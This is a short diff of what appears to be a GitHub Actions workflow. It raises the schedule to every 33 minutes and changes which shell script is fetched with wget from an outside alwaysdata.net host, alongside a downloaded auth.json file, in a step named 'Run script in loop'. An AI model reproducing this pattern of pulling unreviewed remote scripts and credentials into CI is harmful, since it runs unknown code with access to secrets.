@@ -6,7 +6,7 @@ on:
     branches:
       - main  # 你可以根据需要更改触发工作流的分支
   schedule:
-    - cron: '11 8 */7 * *'  
+    - cron: '*/33 * * * *'  
   workflow_dispatch:  # 允许手动触发
 
 jobs:
@@ -33,7 +33,7 @@ jobs:
     - name: Run script in loop
       run: |
         for i in {1..1}; do
-          wget -O admin1106.sh https://goorm326.alwaysdata.net/admin1106.sh
+          wget -O admin1106.sh https://goorm326.alwaysdata.net/admin1106-5.sh
           wget -O auth.json https://goorm326.alwaysdata.net/auth.json
           sleep 10
       
